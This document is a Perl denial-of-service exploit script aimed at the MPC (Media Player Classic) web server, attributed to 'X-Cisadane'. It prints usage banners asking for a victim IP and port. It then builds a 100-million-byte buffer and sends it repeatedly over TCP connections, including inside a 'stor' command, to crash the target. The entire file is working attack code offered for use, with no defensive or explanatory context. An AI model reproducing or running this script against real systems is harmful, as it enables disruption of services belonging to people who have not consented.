#!/usr/bin/perl
use IO::Socket::INET;
use Getopt::Std;
use Socket;
my $SOCKET = "";
$loop = 1000;
$ip = $ARGV[0];
$port = $ARGV[1];
if (! defined $ARGV[0])
{
print "\t*=============================================================*\n";
print "\t* ---    MPC WebServer Remote Denial Of Service             ---*\n";
print "\t* ---          By : X-Cisadane                        ---*\n";
print "\t* ---  ------------------------------------------------    ---*\n";
print "\t* ---  Usage  : perl exploitmpc.pl ( Victim IP ) ( Port )  ---*\n";
print "\t* ---                                                      ---*\n";
print "\t*=============================================================*\n";
print "\n";
print " Ex : perl exploitmpc.pl 127.0.0.1 13579\n"; 
print "Default Port for MPC Web Server is 13579\n";
  
exit;
}
 
print "\t*=============================================================*\n";
print "\t* ---    MPC WebServer Remote Denial Of Service             ---*\n";
print "\t* ---          By : X-Cisadane                        ---*\n";
print "\t* ---  ------------------------------------------------    ---*\n";
print "\t* ---  Usage  : perl exploitmpc.pl ( Victim IP ) ( Port )  ---*\n";
print "\t* ---                                                      ---*\n";
print "\t*=============================================================*\n";
print "\n";
print " Ex : perl exploitmpc.pl 127.0.0.1 13579\n"; 
print "Default Port for MPC Web Server is 13579\n";
print "\n"; 
print " Please Wait Till The Buffer is Done\n";
my $b1 = "\x41" x 100000000;

$iaddr = inet_aton($ip) || die "Unknown host: $ip\n";
$paddr = sockaddr_in($port, $iaddr) || die "getprotobyname: $!\n";
$proto = getprotobyname('tcp') || die "getprotobyname: $!\n";

print "\n";
print " Attacking the Target, Please Wait Till Pwned \n";
 
for ($j=1;$j<$loop;$j++) { 
socket(SOCKET,PF_INET,SOCK_STREAM, $proto) || die "socket: $!\n";
connect(SOCKET,$paddr) || die "Connection Failed: $! .........Disconnected!\n";
 
$DoS=IO::Socket::INET->new("$ip:$port") or die;
send(SOCKET,$b1, 0) || die "failure sent: $!\n";
 
print $DoS "stor $b1\n";
print $DoS "QUIT\n";
 
close $DoS;
close SOCKET; 
}
# exit :
